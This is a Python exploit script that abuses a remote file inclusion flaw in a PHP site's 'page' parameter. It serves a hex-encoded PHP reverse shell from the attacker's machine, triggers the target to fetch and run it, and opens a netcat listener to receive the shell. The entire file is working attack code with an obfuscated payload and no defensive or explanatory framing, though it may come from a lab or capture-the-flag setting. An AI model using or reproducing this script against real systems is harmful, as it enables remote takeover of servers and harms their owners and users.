#! /usr/bin/env python3

from sys import argv
from requests import get
from os import path, mkdir, system, remove, rmdir
from socketserver import TCPServer
from http.server import BaseHTTPRequestHandler
from threading import Thread, Timer


def main():
    if len(argv) != 4:
        print('Usage: exploit.py target listener_ip listener_port')
        exit(-1)
    target = argv[1]
    ip = argv[2]
    port = argv[3]
    Timer(3, exploit, args=(target, ip, port)).start()
    start_listener(port)


def exploit(target, ip, port):
    p = prepare_payload(ip, port)
    with TCPServer(("", 80), generate_handler({'/p.php': 'application/octet-stream'})) as httpd:
        print("serving at port", 80)
        Thread(target=req, args=(target, p)).start()
        httpd.handle_request()
        httpd.server_close()
    cleanup()


def generate_handler(files=None):
    if files is None:
        files = {}

    class MyHandler(BaseHTTPRequestHandler):
        def do_GET(self):
            """Respond to a GET request."""
            if self.path in files.keys():
                content_type = files[self.path]
                content = open('./exp/p.php').read()
                self.send_response(200)
                self.send_header("Content-type", content_type)
                self.end_headers()
                self.wfile.write(content.encode())
            else:
                self.send_error(404)

    return MyHandler


def start_listener(port):
    system('nc -nlvp {0}'.format(port))


def prepare_payload(ip, port):
    if not path.exists('./exp'):
        mkdir('./exp')
    with open('./exp/p.php', 'w') as payload_file:
        payload_file.write(bytes.fromhex(get_base_payload()).decode('UTF-8').replace("Shell('localhost', 4444)",
                                                                                     "Shell('{0}', {1})".format(ip,
                                                                                                                port)))
    return 'http://' + ip + '/p.php'


def cleanup():
    if path.exists('./exp/p.php'):
        remove('./exp/p.php')
    if path.exists('./exp'):
        rmdir('./exp')


def req(target, p):
    if 'http' not in target:
        target = 'http://' + target
    if '/' not in target[7:]:
        target = target + '/site/index.php'
    get(target, params={"page": p})


def get_base_payload():
    return '3c3f7068700a2f2f20436f70797269676874202863292032303230204976616e20c5a0696e63656b0a2f2f2076322e340a2f2f205265717569726573205048502076352e302e30206f7220677265617465722e0a2f2f20576f726b73206f6e204c696e7578204f532c206d61634f532c20616e642057696e646f7773204f532e0a2f2f2053656520746865206f726967696e616c207363726970742061742068747470733a2f2f6769746875622e636f6d2f70656e746573746d6f6e6b65792f7068702d726576657273652d7368656c6c2e0a636c617373205368656c6c207b0a202020207072697661746520246164647220203d206e756c6c3b0a20202020707269766174652024706f727420203d206e756c6c3b0a202020207072697661746520246f73202020203d206e756c6c3b0a202020207072697661746520247368656c6c203d206e756c6c3b0a2020202070726976617465202464657363726970746f7273706563203d206172726179280a202020202020202030203d3e206172726179282770697065272c20277227292c202f2f207368656c6c2063616e20726561642066726f6d20535444494e0a202020202020202031203d3e206172726179282770697065272c20277727292c202f2f207368656c6c2063616e20777269746520746f205354444f55540a202020202020202032203d3e206172726179282770697065272c202777272920202f2f207368656c6c2063616e20777269746520746f205354444552520a20202020293b0a2020202070726976617465202462756666657220203d20313032343b202020202f2f20726561642f7772697465206275666665722073697a650a20202020707269766174652024636c656e202020203d20303b202020202020202f2f20636f6d6d616e64206c656e6774680a202020207072697661746520246572726f722020203d2066616c73653b2020202f2f2073747265616d20726561642f7772697465206572726f720a202020207075626c69632066756e6374696f6e205f5f636f6e7374727563742824616464722c2024706f727429207b0a202020202020202024746869732d3e61646472203d2024616464723b0a202020202020202024746869732d3e706f7274203d2024706f72743b0a202020207d0a20202020707269766174652066756e6374696f6e206465746563742829207b0a2020202020202020246465746563746564203d20747275653b0a20202020202020206966202873747269706f73285048505f4f532c20274c494e5558272920213d3d2066616c736529207b202f2f2073616d6520666f72206d61634f530a20202020202020202020202024746869732d3e6f73202020203d20274c494e5558273b0a20202020202020202020202024746869732d3e7368656c6c203d20272f62696e2f7368273b0a20202020202020207d20656c7365206966202873747269706f73285048505f4f532c202757494e3332272920213d3d2066616c7365207c7c2073747269706f73285048505f4f532c202757494e4e54272920213d3d2066616c7365207c7c2073747269706f73285048505f4f532c202757494e444f5753272920213d3d2066616c736529207b0a20202020202020202020202024746869732d3e6f73202020203d202757494e444f5753273b0a20202020202020202020202024746869732d3e7368656c6c203d2027636d642e657865273b0a20202020202020207d20656c7365207b0a202020202020202020202020246465746563746564203d2066616c73653b0a2020202020202020202020206563686f20225359535f4552524f523a20556e6465726c79696e67206f7065726174696e672073797374656d206973206e6f7420737570706f727465642c207363726970742077696c6c206e6f7720657869742e2e2e5c6e223b0a20202020202020207d0a202020202020202072657475726e202464657465637465643b0a202020207d0a20202020707269766174652066756e6374696f6e206461656d6f6e697a652829207b0a20202020202020202465786974203d2066616c73653b0a2020202020202020696620282166756e6374696f6e5f657869737473282770636e746c5f666f726b272929207b0a2020202020202020202020206563686f20224441454d4f4e495a453a2070636e746c5f666f726b282920646f6573206e6f74206578697374732c206d6f76696e67206f6e2e2e2e5c6e223b0a20202020202020207d20656c736520696620282824706964203d204070636e746c5f666f726b282929203c203029207b0a2020202020202020202020206563686f20224441454d4f4e495a453a2043616e6e6f7420666f726b206f66662074686520706172656e742070726f636573732c206d6f76696e67206f6e2e2e2e5c6e223b0a20202020202020207d20656c7365206966202824706964203e203029207b0a2020202020202020202020202465786974203d20747275653b0a2020202020202020202020206563686f20224441454d4f4e495a453a204368696c642070726f6365737320666f726b6564206f6666207375636365737366756c6c792c20706172656e742070726f636573732077696c6c206e6f7720657869742e2e2e5c6e223b0a20202020202020207d20656c73652069662028706f7369785f7365747369642829203c203029207b0a2020202020202020202020202f2f206f6e6365206461656d6f6e697a656420796f752077696c6c2061637475616c6c79206e6f206c6f6e67657220736565207468652073637269707427732064756d700a2020202020202020202020206563686f20224441454d4f4e495a453a20466f726b6564206f66662074686520706172656e742070726f63657373206275742063616e6e6f74207365742061206e6577205349442c206d6f76696e67206f6e20617320616e206f727068616e2e2e2e5c6e223b0a20202020202020207d20656c7365207b0a2020202020202020202020206563686f20224441454d4f4e495a453a20436f6d706c65746564207375636365737366756c6c79215c6e223b0a20202020202020207d0a202020202020202072657475726e2024657869743b0a202020207d0a20202020707269766174652066756e6374696f6e2073657474696e67732829207b0a2020202020202020406572726f725f7265706f7274696e672830293b0a2020202020202020407365745f74696d655f6c696d69742830293b202f2f20646f206e6f7420696d706f7365207468652073637269707420657865637574696f6e2074696d65206c696d69740a202020202020202040756d61736b2830293b202f2f20736574207468652066696c652f6469726563746f7279207065726d697373696f6e73202d2036363620666f722066696c657320616e642037373720666f72206469726563746f726965730a202020207d0a20202020707269766174652066756e6374696f6e2064756d7028246461746129207b0a20202020202020202464617461203d207374725f7265706c61636528273c272c2027266c743b272c202464617461293b0a20202020202020202464617461203d207374725f7265706c61636528273e272c20272667743b272c202464617461293b0a20202020202020206563686f2024646174613b0a202020207d0a20202020707269766174652066756e6374696f6e2072656164282473747265616d2c20246e616d652c202462756666657229207b0a202020202020202069662028282464617461203d20406672656164282473747265616d2c20246275666665722929203d3d3d2066616c736529207b202f2f20737570707265737320616e206572726f72207768656e2072656164696e672066726f6d206120636c6f73656420626c6f636b696e672073747265616d0a20202020202020202020202024746869732d3e6572726f72203d20747275653b202020202020202020202020202020202020202020202020202020202f2f2073657420676c6f62616c206572726f7220666c61670a2020202020202020202020206563686f20225354524d5f4552524f523a2043616e6e6f7420726561642066726f6d207b246e616d657d2c207363726970742077696c6c206e6f7720657869742e2e2e5c6e223b0a20202020202020207d0a202020202020202072657475726e2024646174613b0a202020207d0a20202020707269766174652066756e6374696f6e207772697465282473747265616d2c20246e616d652c20246461746129207b0a20202020202020206966202828246279746573203d2040667772697465282473747265616d2c2024646174612929203d3d3d2066616c736529207b202f2f20737570707265737320616e206572726f72207768656e2077726974696e6720746f206120636c6f73656420626c6f636b696e672073747265616d0a20202020202020202020202024746869732d3e6572726f72203d20747275653b202020202020202020202020202020202020202020202020202020202f2f2073657420676c6f62616c206572726f7220666c61670a2020202020202020202020206563686f20225354524d5f4552524f523a2043616e6e6f7420777269746520746f207b246e616d657d2c207363726970742077696c6c206e6f7720657869742e2e2e5c6e223b0a20202020202020207d0a202020202020202072657475726e202462797465733b0a202020207d0a202020202f2f20726561642f7772697465206d6574686f6420666f72206e6f6e2d626c6f636b696e672073747265616d730a20202020707269766174652066756e6374696f6e2072772824696e7075742c20246f75747075742c2024696e616d652c20246f6e616d6529207b0a20202020202020207768696c652028282464617461203d2024746869732d3e726561642824696e7075742c2024696e616d652c2024746869732d3e62756666657229292026262024746869732d3e777269746528246f75747075742c20246f6e616d652c2024646174612929207b0a2020202020202020202020206966202824746869732d3e6f73203d3d3d202757494e444f57532720262620246f6e616d65203d3d3d2027535444494e2729207b2024746869732d3e636c656e202b3d207374726c656e282464617461293b207d202f2f2063616c63756c6174652074686520636f6d6d616e64206c656e6774680a20202020202020202020202024746869732d3e64756d70282464617461293b202f2f2073637269707427732064756d700a20202020202020207d0a202020207d0a202020202f2f20726561642f7772697465206d6574686f6420666f7220626c6f636b696e672073747265616d732028652e672e20666f72205354444f555420616e6420535444455252206f6e2057696e646f7773204f53290a202020202f2f207765206d7573742072656164207468652065786163742062797465206c656e6774682066726f6d20612073747265616d20616e64206e6f7420612073696e676c652062797465206d6f72650a20202020707269766174652066756e6374696f6e206272772824696e7075742c20246f75747075742c2024696e616d652c20246f6e616d6529207b0a2020202020202020246673746174203d2066737461742824696e707574293b0a20202020202020202473697a65203d202466737461745b2773697a65275d3b0a20202020202020206966202824746869732d3e6f73203d3d3d202757494e444f5753272026262024696e616d65203d3d3d20275354444f5554272026262024746869732d3e636c656e29207b0a2020202020202020202020202f2f20666f7220736f6d6520726561736f6e2057696e646f7773204f5320706970657320535444494e20696e746f205354444f55540a2020202020202020202020202f2f20776520646f206e6f74206c696b6520746861740a2020202020202020202020202f2f207765206e65656420746f20646973636172642074686520646174612066726f6d207468652073747265616d0a2020202020202020202020207768696c65202824746869732d3e636c656e203e20302026262028246279746573203d2024746869732d3e636c656e203e3d2024746869732d3e627566666572203f2024746869732d3e627566666572203a2024746869732d3e636c656e292026262024746869732d3e726561642824696e7075742c2024696e616d652c202462797465732929207b0a2020202020202020202020202020202024746869732d3e636c656e202d3d202462797465733b0a202020202020202020202020202020202473697a65202d3d202462797465733b0a2020202020202020202020207d0a20202020202020207d0a20202020202020207768696c6520282473697a65203e20302026262028246279746573203d202473697a65203e3d2024746869732d3e627566666572203f2024746869732d3e627566666572203a202473697a652920262620282464617461203d2024746869732d3e726561642824696e7075742c2024696e616d652c2024627974657329292026262024746869732d3e777269746528246f75747075742c20246f6e616d652c2024646174612929207b0a2020202020202020202020202473697a65202d3d202462797465733b0a20202020202020202020202024746869732d3e64756d70282464617461293b202f2f2073637269707427732064756d700a20202020202020207d0a202020207d0a202020207075626c69632066756e6374696f6e2072756e2829207b0a20202020202020206966202824746869732d3e6465746563742829202626202124746869732d3e6461656d6f6e697a65282929207b0a20202020202020202020202024746869732d3e73657474696e677328293b0a0a2020202020202020202020202f2f202d2d2d2d2d20534f434b455420424547494e202d2d2d2d2d0a20202020202020202020202024736f636b6574203d204066736f636b6f70656e2824746869732d3e616464722c2024746869732d3e706f72742c20246572726e6f2c20246572727374722c203330293b0a202020202020202020202020696620282124736f636b657429207b0a202020202020202020202020202020206563686f2022534f435f4552524f523a207b246572726e6f7d3a207b246572727374727d5c6e223b0a2020202020202020202020207d20656c7365207b0a2020202020202020202020202020202073747265616d5f7365745f626c6f636b696e672824736f636b65742c2066616c7365293b202f2f207365742074686520736f636b65742073747265616d20746f206e6f6e2d626c6f636b696e67206d6f6465207c2072657475726e7320277472756527206f6e2057696e646f7773204f530a0a202020202020202020202020202020202f2f202d2d2d2d2d205348454c4c20424547494e202d2d2d2d2d0a202020202020202020202020202020202470726f63657373203d204070726f635f6f70656e2824746869732d3e7368656c6c2c2024746869732d3e64657363726970746f72737065632c202470697065732c206e756c6c2c206e756c6c293b0a2020202020202020202020202020202069662028212470726f6365737329207b0a20202020202020202020202020202020202020206563686f202250524f435f4552524f523a2043616e6e6f7420737461727420746865207368656c6c5c6e223b0a202020202020202020202020202020207d20656c7365207b0a2020202020202020202020202020202020202020666f7265616368202824706970657320617320247069706529207b0a20202020202020202020202020202020202020202020202073747265616d5f7365745f626c6f636b696e672824706970652c2066616c7365293b202f2f2073657420746865207368656c6c2073747265616d7320746f206e6f6e2d626c6f636b696e67206d6f6465207c2072657475726e73202766616c736527206f6e2057696e646f7773204f530a20202020202020202020202020202020202020207d0a0a20202020202020202020202020202020202020202f2f202d2d2d2d2d20574f524b20424547494e202d2d2d2d2d0a202020202020202020202020202020202020202024737461747573203d2070726f635f6765745f737461747573282470726f63657373293b0a2020202020202020202020202020202020202020406677726974652824736f636b65742c2022534f434b45543a205368656c6c2068617320636f6e6e656374656421205049443a207b247374617475735b27706964275d7d5c6e22293b0a2020202020202020202020202020202020202020646f207b0a20202020202020202020202020202020202020202020202024737461747573203d2070726f635f6765745f737461747573282470726f63657373293b0a2020202020202020202020202020202020202020202020206966202866656f662824736f636b65742929207b202f2f20636865636b20666f7220656e642d6f662d66696c65206f6e20534f434b45540a202020202020202020202020202020202020202020202020202020206563686f2022534f435f4552524f523a205368656c6c20636f6e6e656374696f6e20686173206265656e207465726d696e617465645c6e223b20627265616b3b0a2020202020202020202020202020202020202020202020207d20656c7365206966202866656f66282470697065735b315d29207c7c2021247374617475735b2772756e6e696e67275d29207b20202020202020202020202020202020202f2f20636865636b20666f7220656e642d6f662d66696c65206f6e205354444f5554206f722069662070726f63657373206973207374696c6c2072756e6e696e670a202020202020202020202020202020202020202020202020202020206563686f202250524f435f4552524f523a205368656c6c2070726f6365737320686173206265656e207465726d696e617465645c6e223b202020627265616b3b202f2f2066656f66282920646f6573206e6f7420776f726b207769746820626c6f636b696e672073747265616d730a2020202020202020202020202020202020202020202020207d20202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202f2f207573652070726f635f6765745f737461747573282920696e73746561640a2020202020202020202020202020202020202020202020202473747265616d73203d206172726179280a202020202020202020202020202020202020202020202020202020202772656164272020203d3e2061727261792824736f636b65742c202470697065735b315d2c202470697065735b325d292c202f2f20534f434b4554207c205354444f5554207c205354444552520a202020202020202020202020202020202020202020202020202020202777726974652720203d3e206e756c6c2c0a202020202020202020202020202020202020202020202020202020202765786365707427203d3e206e756c6c0a202020202020202020202020202020202020202020202020293b0a202020202020202020202020202020202020202020202020246e756d5f6368616e6765645f73747265616d73203d204073747265616d5f73656c656374282473747265616d735b2772656164275d2c202473747265616d735b277772697465275d2c202473747265616d735b27657863657074275d2c2030293b202f2f207761697420666f722073747265616d206368616e676573207c2077696c6c206e6f742077616974206f6e2057696e646f7773204f530a20202020202020202020202020202020202020202020202069662028246e756d5f6368616e6765645f73747265616d73203d3d3d2066616c736529207b0a202020202020202020202020202020202020202020202020202020206563686f20225354524d5f4552524f523a2073747265616d5f73656c6563742829206661696c65645c6e223b20627265616b3b0a2020202020202020202020202020202020202020202020207d20656c73652069662028246e756d5f6368616e6765645f73747265616d73203e203029207b0a202020202020202020202020202020202020202020202020202020206966202824746869732d3e6f73203d3d3d20274c494e55582729207b0a202020202020202020202020202020202020202020202020202020202020202069662028696e5f61727261792824736f636b657420202c202473747265616d735b2772656164275d2929207b2024746869732d3e72772824736f636b657420202c202470697065735b305d2c2027534f434b4554272c2027535444494e2720293b207d202f2f20726561642066726f6d20534f434b455420616e6420777269746520746f20535444494e0a202020202020202020202020202020202020202020202020202020202020202069662028696e5f6172726179282470697065735b325d2c202473747265616d735b2772656164275d2929207b2024746869732d3e7277282470697065735b325d2c2024736f636b657420202c2027535444455252272c2027534f434b455427293b207d202f2f20726561642066726f6d2053544445525220616e6420777269746520746f20534f434b45540a202020202020202020202020202020202020202020202020202020202020202069662028696e5f6172726179282470697065735b315d2c202473747265616d735b2772656164275d2929207b2024746869732d3e7277282470697065735b315d2c2024736f636b657420202c20275354444f5554272c2027534f434b455427293b207d202f2f20726561642066726f6d205354444f555420616e6420777269746520746f20534f434b45540a202020202020202020202020202020202020202020202020202020207d20656c7365206966202824746869732d3e6f73203d3d3d202757494e444f57532729207b0a20202020202020202020202020202020202020202020202020202020202020202f2f206f7264657220697320696d706f7274616e740a202020202020202020202020202020202020202020202020202020202020202069662028696e5f61727261792824736f636b65742c202473747265616d735b2772656164275d292f2a2d2d2d2d2d2d2a2f29207b2024746869732d3e7277202824736f636b657420202c202470697065735b305d2c2027534f434b4554272c2027535444494e2720293b207d202f2f20726561642066726f6d20534f434b455420616e6420777269746520746f20535444494e0a20202020202020202020202020202020202020202020202020202020202020206966202828246673746174203d206673746174282470697065735b325d2929202626202466737461745b2773697a65275d29207b2024746869732d3e627277282470697065735b325d2c2024736f636b657420202c2027535444455252272c2027534f434b455427293b207d202f2f20726561642066726f6d2053544445525220616e6420777269746520746f20534f434b45540a20202020202020202020202020202020202020202020202020202020202020206966202828246673746174203d206673746174282470697065735b315d2929202626202466737461745b2773697a65275d29207b2024746869732d3e627277282470697065735b315d2c2024736f636b657420202c20275354444f5554272c2027534f434b455427293b207d202f2f20726561642066726f6d205354444f555420616e6420777269746520746f20534f434b45540a202020202020202020202020202020202020202020202020202020207d0a2020202020202020202020202020202020202020202020207d0a20202020202020202020202020202020202020207d207768696c6520282124746869732d3e6572726f72293b0a20202020202020202020202020202020202020202f2f202d2d2d2d2d2d20574f524b20454e44202d2d2d2d2d2d0a0a2020202020202020202020202020202020202020666f7265616368202824706970657320617320247069706529207b0a20202020202020202020202020202020202020202020202066636c6f7365282470697065293b0a20202020202020202020202020202020202020207d0a202020202020202020202020202020202020202070726f635f636c6f7365282470726f63657373293b0a202020202020202020202020202020207d0a202020202020202020202020202020202f2f202d2d2d2d2d2d205348454c4c20454e44202d2d2d2d2d2d0a0a2020202020202020202020202020202066636c6f73652824736f636b6574293b0a2020202020202020202020207d0a2020202020202020202020202f2f202d2d2d2d2d2d20534f434b455420454e44202d2d2d2d2d2d0a0a20202020202020207d0a202020207d0a7d0a6563686f20273c7072653e273b0a2f2f206368616e67652074686520686f7374206164647265737320616e642f6f7220706f7274206e756d626572206173206e65636573736172790a247368203d206e6577205368656c6c28276c6f63616c686f7374272c2034343434293b0a2473682d3e72756e28293b0a756e73657428247368293b0a2f2f206761726261676520636f6c6c6563746f72207265717569726573205048502076352e332e30206f7220677265617465720a2f2f204067635f636f6c6c6563745f6379636c657328293b0a6563686f20273c2f7072653e273b0a3f3e'


if __name__ == '__main__':
    main()
